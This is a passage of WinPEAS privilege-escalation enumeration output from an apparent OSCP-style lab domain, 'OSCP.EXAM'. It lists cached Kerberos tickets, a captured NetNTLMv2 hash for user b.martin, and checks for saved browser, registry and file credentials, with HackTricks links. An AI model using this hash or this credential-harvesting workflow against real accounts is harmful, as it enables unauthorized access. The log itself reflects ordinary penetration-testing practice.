╔══════════╣ Checking for RDCMan Settings Files
╚ Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager
    Not Found

╔══════════╣ Looking for Kerberos tickets
╚  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    serverName: krbtgt/OSCP.EXAM
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwarded, forwardable
   =================================================================================================

    serverName: krbtgt/OSCP.EXAM
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, initial, renewable, forwardable
   =================================================================================================

    serverName: ldap/DC20.oscp.exam/oscp.exam
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:47 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/dc20.oscp.exam
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/DC20
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: ldap/dc20.oscp.exam
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================


╔══════════╣ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

╔══════════╣ Looking AppCmd.exe
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe
    Not Found
      You must be an administrator to run this check

╔══════════╣ Looking SSClient.exe
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm
    Not Found

╔══════════╣ Enumerating SSCM - System Center Configuration Manager settings

╔══════════╣ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    b.martin::OSCP:1122334455667788:dcc8aa88d352d72df12e450dcb8f138d:0101000000000000f0dfd06d03a4dc01a1556545053faf06000000000800300030000000000000000000000000200000ebda44c9528111c7aa6c6fdab865eb67f1324fe68423c1aaca04c03a1bc979750a00100000000000000000000000000000000000090000000000000000000000

   =================================================================================================



════════════════════════════════════╣ Browsers Information ╠════════════════════════════════════

╔══════════╣ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Looking for Firefox DBs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Looking for GET credentials in Firefox history
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Looking for Chrome DBs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Looking for GET credentials in Chrome history
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Chrome bookmarks
    Not Found

╔══════════╣ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Current IE tabs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Looking for GET credentials in IE history
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history


╔══════════╣ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

╔══════════╣ IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


════════════════════════════════════╣ Interesting files and registry ╠════════════════════════════════════

╔══════════╣ Putty Sessions
    Not Found

╔══════════╣ Putty SSH Host keys
    Not Found

╔══════════╣ SSH keys in registry
╚ If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry
    Not Found

╔══════════╣ SuperPutty configuration files

╔══════════╣ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-2481101513-2954867870-2660283483-1104
   =================================================================================================

    SID: S-1-5-21-318536300-2164503644-2098472648-1001
   =================================================================================================

    SID: S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
   =================================================================================================

    SID: S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430
   =================================================================================================

    SID: S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


╔══════════╣ Cloud Credentials
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

╔══════════╣ Unattend Files

╔══════════╣ Looking for common SAM & SYSTEM backups

╔══════════╣ Looking for McAfee Sitelist.xml Files

╔══════════╣ Cached GPP Passwords

╔══════════╣ Looking for possible regs with creds
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

╔══════════╣ Looking for possible password files in users homes
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

╔══════════╣ Searching for Oracle SQL Developer config files


╔══════════╣ Slack files & directories
  note: check manually if something is found

╔══════════╣ Looking for LOL Binaries and Scripts (can be slow)
╚  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

╔══════════╣ Enumerating Outlook download files


╔══════════╣ Enumerating machine and user certificate files


╔══════════╣ Searching known files that can contain creds in home
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials

╔══════════╣ Looking for documents --limit 100--
    Not Found

╔══════════╣ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

╔══════════╣ Recent files --limit 70--
    Not Found

╔══════════╣ Looking inside the Recycle Bin for creds files
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

╔══════════╣ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\b.martin\ntuser.pol
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default

╔══════════╣ Searching interesting files in other users home directories (can be slow)

     Checking folder: c:\users\administrator

   =================================================================================================

     Checking folder: c:\users\jenkins

   =================================================================================================


╔══════════╣ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\b.martin\WinPEASx64.exe": b.martin [Allow: AllAccess]

╔══════════╣ Looking for Linux shells/distributions - wsl.exe, bash.exe

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/


```